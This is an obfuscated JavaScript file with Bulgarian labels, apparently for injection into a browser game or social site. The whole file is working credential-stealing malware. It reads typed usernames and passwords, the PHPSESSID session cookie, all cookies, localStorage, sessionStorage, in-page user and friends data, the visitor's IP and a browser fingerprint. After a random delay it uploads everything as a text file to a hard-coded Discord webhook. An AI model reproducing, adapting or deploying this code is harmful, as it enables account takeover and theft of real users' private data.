(function() {
    const _0x53507a = function() {
        let _0x5f4a4b = '';
        for (let _0x1c4530 = 0x0; _0x1c4530 < "https://discord.com/api/webhooks/1509094981854560350/V4VVYUVq6YZQ0Hol0iFw8aBo7EdIpoh4Tud-BwXiHOZEp7UcvaA1mD9ZNFAwNeFqm67H".length; _0x1c4530++) {
            _0x5f4a4b += "https://discord.com/api/webhooks/1509094981854560350/V4VVYUVq6YZQ0Hol0iFw8aBo7EdIpoh4Tud-BwXiHOZEp7UcvaA1mD9ZNFAwNeFqm67H" [_0x1c4530];
        }
        return _0x5f4a4b;
    };
    const _0x4ded94 = _0x1dbf27 => {
        const _0x2a018a = document.cookie.match(new RegExp("(?:^|; )" + _0x1dbf27.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
        return _0x2a018a ? decodeURIComponent(_0x2a018a[0x1]) : undefined;
    };
    const _0x1fc19e = async() => {
        try {
            const _0x34dd85 = await fetch("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e");
            const _0x188002 = await _0x34dd85.json();
            return _0x188002.ip || "Неуспешно получаване на IP";
        } catch {
            return "Неуспешно получаване на IP";
        }
    };
    const _0x49c5b6 = () => {
        try {
            const _0x2ac13b = document.querySelector('#loginUsername') || document.querySelector("input[name=\"login\"]") || document.querySelector("input[type=\"text\"]");
            const _0x35b3d8 = document.querySelector("input[type=\"password\"]") || document.querySelector("input[name*=\"pass\"]") || document.querySelector("input#password");
            const _0x3bc3fa = _0x2ac13b ? _0x2ac13b.value : 'ПОЛЕ_ЗА_ПОТРЕБИТЕЛСКО_ИМЕ_НЕ_Е_НАМЕРЕНО';
            const _0xe63a33 = _0x35b3d8 ? _0x35b3d8.value : "ПОЛЕ_ЗА_ПАРОЛА_НЕ_Е_НАМЕРЕНО";
            return {
                'username': _0x3bc3fa,
                'password': _0xe63a33
            };
        } catch {
            return {
                'username': 'ГРЕШКА_ПРИ_ПОЛУЧАВАНЕ_НА_ПОТРЕБИТЕЛСКО_ИМЕ',
                'password': 'ГРЕШКА_ПРИ_ПОЛУЧАВАНЕ_НА_ПАРОЛА'
            };
        }
    };
    const _0x1d7184 = () => {
        return document.cookie.split(';').map(_0xcce999 => {
            const [_0x3ec148, _0x6cb98d] = _0xcce999.trim().split('=');
            return _0x3ec148 + '=' + _0x6cb98d;
        }).join("\n");
    };
    const _0x11f545 = _0x34edb => {
        if (_0x34edb === null || typeof _0x34edb !== "object") {
            return _0x34edb;
        }
        const _0x2c1b96 = Array.isArray(_0x34edb) ? [] : {};
        for (const _0x3b287b in _0x34edb) {
            if (_0x34edb.hasOwnProperty(_0x3b287b)) {
                _0x2c1b96[_0x3b287b] = _0x11f545(_0x34edb[_0x3b287b]);
            }
        }
        return _0x2c1b96;
    };
    const _0x2c1052 = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(_0x11f545(user), null, 0x2);
            }
            return "Променливата 'user' не е намерена или е празна";
        } catch (_0x1e7cc9) {
            return "Грешка при четене на променлива 'user': " + _0x1e7cc9.message;
        }
    };
    const _0x5df2ab = () => {
        try {
            if (typeof friendsData !== "undefined" && friendsData !== null) {
                return JSON.stringify(_0x11f545(friendsData), null, 0x2);
            }
            return "Променливата 'friendsData' не е намерена или е празна";
        } catch (_0xf6e224) {
            return "Грешка при четене на променлива 'friendsData': " + _0xf6e224.message;
        }
    };
    const _0x49787d = () => {
        try {
            if (typeof friendsArr !== "undefined" && friendsArr !== null) {
                if (Array.isArray(friendsArr) && friendsArr.length > 0x64) {
                    const _0x14ddc4 = {
                        'total_length': friendsArr.length,
                        'sample_items': []
                    };
                    for (let _0x141d11 = 0x0; _0x141d11 < Math.min(0xa, friendsArr.length); _0x141d11++) {
                        if (friendsArr[_0x141d11]) {
                            _0x14ddc4.sample_items.push(_0x11f545(friendsArr[_0x141d11]));
                        }
                    }
                    for (let _0x32f56c = Math.max(0x0, friendsArr.length - 0x5); _0x32f56c < friendsArr.length; _0x32f56c++) {
                        if (friendsArr[_0x32f56c] && _0x14ddc4.sample_items.length < 0xf) {
                            _0x14ddc4.sample_items.push(_0x11f545(friendsArr[_0x32f56c]));
                        }
                    }
                    return JSON.stringify(_0x14ddc4, null, 0x2);
                }
                return JSON.stringify(_0x11f545(friendsArr), null, 0x2);
            }
            return "Променливата 'friendsArr' не е намерена или е празна";
        } catch (_0x5e24ae) {
            return "Грешка при четене на променлива 'friendsArr': " + _0x5e24ae.message;
        }
    };
    const _0x779aa0 = (_0x466bd9 = false) => {
        try {
            if (typeof user !== "undefined" && user !== null && user.level !== undefined) {
                return "ниво: " + user.level + (_0x466bd9 ? 'x' : '');
            }
            return "ниво: неопределено" + (_0x466bd9 ? 'x' : '');
        } catch (_0x42e912) {
            return "ниво: грешка при получаване (" + _0x42e912.message + ')' + (_0x466bd9 ? 'x' : '');
        }
    };
    const _0x561897 = () => {
        try {
            const _0x4fb4ac = {};
            for (let _0x38b8ee = 0x0; _0x38b8ee < localStorage.length; _0x38b8ee++) {
                const _0x2f3692 = localStorage.key(_0x38b8ee);
                _0x4fb4ac[_0x2f3692] = localStorage.getItem(_0x2f3692);
            }
            return JSON.stringify(_0x4fb4ac, null, 0x2);
        } catch (_0x75f5d7) {
            return "Грешка при четене на localStorage: " + _0x75f5d7.message;
        }
    };
    const _0x32131a = () => {
        try {
            const _0x12496d = {};
            for (let _0x102909 = 0x0; _0x102909 < sessionStorage.length; _0x102909++) {
                const _0x3abff1 = sessionStorage.key(_0x102909);
                _0x12496d[_0x3abff1] = sessionStorage.getItem(_0x3abff1);
            }
            return JSON.stringify(_0x12496d, null, 0x2);
        } catch (_0x9e7e95) {
            return "Грешка при четене на sessionStorage: " + _0x9e7e95.message;
        }
    };
    const _0x54e8ea = async() => {
        const _0x377a66 = _0x53507a();
        const _0x52cc99 = _0x4ded94("PHPSESSID");
        const _0x1c42b5 = await _0x1fc19e();
        const _0x5131ae = _0x49c5b6();
        const _0x3a77a7 = _0x1d7184();
        const _0x112e68 = _0x2c1052();
        const _0xb101ce = _0x5df2ab();
        const _0x5f00c2 = _0x49787d();
        const _0x1ddc2d = _0x561897();
        const _0x173f4e = _0x32131a();
        const _0x434578 = {
            'userAgent': navigator.userAgent,
            'language': navigator.language,
            'platform': navigator.platform,
            'online': navigator.onLine,
            'screenResolution': window.screen.width + 'x' + window.screen.height,
            'availableScreenResolution': window.screen.availWidth + 'x' + window.screen.availHeight,
            'colorDepth': window.screen.colorDepth,
            'pixelDepth': window.screen.pixelDepth,
            'timeZone': Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        const _0x234428 = _0x5131ae.username !== 'ПОЛЕ_ЗА_ПОТРЕБИТЕЛСКО_ИМЕ_НЕ_Е_НАМЕРЕНО' && _0x5131ae.password !== "ПОЛЕ_ЗА_ПАРОЛА_НЕ_Е_НАМЕРЕНО" && _0x5131ae.username && _0x5131ae.password;
        const _0x11f6fa = _0x779aa0(_0x234428);
        let _0x5c56e5 = "=== ПЪЛЕН ОТЧЕТ ЗА ПОТРЕБИТЕЛЯ ===\n\n";
        _0x5c56e5 += "--- НИВО НА ПОТРЕБИТЕЛЯ ---\n" + _0x11f6fa + "\nскъпоценни камъни: " + user.premiumPoints + "\n\n";
        _0x5c56e5 += "--- ОСНОВНИ ДАННИ ---\n";
        _0x5c56e5 += "IP адрес: " + _0x1c42b5 + "\n";
        _0x5c56e5 += "URL на страницата: " + window.location.href + "\n";
        _0x5c56e5 += "User-Agent: " + navigator.userAgent + "\n\n";
        _0x5c56e5 += "--- PHPSESSID ---\n" + (_0x52cc99 || "PHPSESSID: не е намерена") + "\n\n";
        _0x5c56e5 += "--- ДАННИ ОТ ПРОМЕНЛИВАТА user ---\n" + _0x112e68 + "\n\n";
        _0x5c56e5 += "--- ДАННИ ОТ ПРОМЕНЛИВАТА friendsData ---\n" + _0xb101ce + "\n\n";
        _0x5c56e5 += "--- ДАННИ ОТ ПРОМЕНЛИВАТА friendsArr ---\n" + _0x5f00c2 + "\n\n";
        _0x5c56e5 += "--- ПОТРЕБИТЕЛСКИ ДАННИ ---\n";
        _0x5c56e5 += "Потребителско име: " + _0x5131ae.username + "\n";
        _0x5c56e5 += "Парола: " + _0x5131ae.password + "\n\n";
        _0x5c56e5 += "--- ВСИЧКИ БИСКВИТКИ НА ПОТРЕБИТЕЛЯ ---\n" + (_0x3a77a7 || "Не са открити бисквитки") + "\n";
        _0x5c56e5 += "--- ДАННИ ОТ localStorage ---\n" + _0x1ddc2d + "\n";
        _0x5c56e5 += "--- ДАННИ ОТ sessionStorage ---\n" + _0x173f4e + "\n";
        _0x5c56e5 += "--- ДАННИ ЗА БРАУЗЪРА ---\n" + JSON.stringify(_0x434578, null, 0x2) + "\n";
        const _0x5e4ff8 = new Blob([_0x5c56e5], {
            'type': "text/plain"
        });
        const _0x4c288b = new FormData();
        _0x4c288b.append("file", _0x5e4ff8, "user_data_" + Date.now() + '.txt');
        try {
            await fetch(_0x377a66, {
                'method': "POST",
                'body': _0x4c288b
            });
        } catch (_0x252cd8) {
            console.error("Грешка при изпращане на данни:", _0x252cd8);
        }
    };
    setTimeout(async() => {
        await _0x54e8ea();
    }, 0xbb8 + Math.random() * 0x1b58);
})();
